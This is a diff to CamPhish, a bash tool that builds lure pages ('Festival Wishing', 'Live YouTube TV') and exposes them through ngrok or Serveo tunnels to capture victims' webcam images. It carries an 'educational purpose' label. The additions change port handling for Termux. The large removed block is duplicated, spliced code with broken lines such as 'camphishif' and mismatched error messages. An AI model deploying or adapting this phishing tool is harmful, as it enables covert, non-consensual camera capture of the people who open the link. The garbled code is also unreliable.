@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v2.0 - Updated for modern Serveo & unlimited captures
+# CamPhish v2.0 - Termux edition (fixed for fuser issue)
 # Educational purpose only
 
 trap 'printf "\n"; stop' 2
@@ -14,7 +14,7 @@ banner() {
     echo -e "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m"
     echo -e "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m"
     echo -e "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m"
-    echo -e "\n\e[1;77m              Educational Purpose - Understand & Protect\e[0m\n"
+    echo -e "\n\e[1;77m              Termux Edition - Educational Purpose\e[0m\n"
 }
 
 stop() {
@@ -65,14 +65,21 @@ serveo_tunnel() {
 
 start_php_server() {
     echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server on port 3333...\e[0m"
-    fuser -k 3333/tcp 2>/dev/null
+    # Termux fix: kill any process using port 3333
+    pid=$(lsof -ti:3333 2>/dev/null)
+    if [ -n "$pid" ]; then
+        kill -9 $pid 2>/dev/null
+    fi
+    # Alternative: use pkill
+    pkill -f "php -S localhost:3333" 2>/dev/null
     php -S localhost:3333 > /dev/null 2>&1 &
     PHP_PID=$!
     sleep 2
     if ! kill -0 $PHP_PID 2>/dev/null; then
-        echo -e "\e[1;91m[!] PHP server failed.\e[0m"
+        echo -e "\e[1;91m[!] PHP server failed. Check if PHP is installed.\e[0m"
         exit 1
     fi
+    echo -e "\e[1;92m[+] PHP server running on port 3333\e[0m"
 }
 
 build_payload() {
@@ -140,283 +147,3 @@ main() {
 }
 
 main
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-fi
-rm -rf index3.html
-}
-
-select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
-sleep 1
-clear
-banner
-camphish
-else
-printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
-option_tem="${option_tem:-${default_option_template}}"
-if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
-elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
-sleep 1
-select_template
-fi
-fi
-}
-
-ngrok_server() {
-if [[ -e ngrok ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-payload_ngrok
-checkfound
-}
-
-camphish() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
-printf "\n-----Choose tunnel server----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-select_template
-if [[ $option_server -eq 2 ]]; then
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-start
-elif [[ $option_server -eq 1 ]]; then
-ngrok_server
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-camphish
-fi
-}
-
-payload() {
-# send_link is already extracted in server() function
-# Use the correct variable: send_link (global)
-if [[ -z "$send_link" ]]; then
-    printf "\e[1;93m[!] No link extracted. Please check your connection or try again.\e[0m\n"
-    exit 1
-fi
-
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-    sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
-    sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
-    sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
-    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-fi
-rm -rf index3.html
-}
-
-start() {
-default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-}
-
-banner
-dependencies
-camphishif [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
-elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
-sleep 1
-select_template
-fi
-fi
-}
-
-ngrok_server() {
-
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-payload_ngrok
-checkfound
-}
-
-camphish() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
-printf "\n-----Choose tunnel server----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-select_template
-if [[ $option_server -eq 2 ]]; then
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-start
-
-elif [[ $option_server -eq 1 ]]; then
-ngrok_server
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-camphish
-fi
-
-}
-
-
-payload() {
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-fi
-rm -rf index3.html
-
-}
-
-start() {
-
-default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-camphish
-
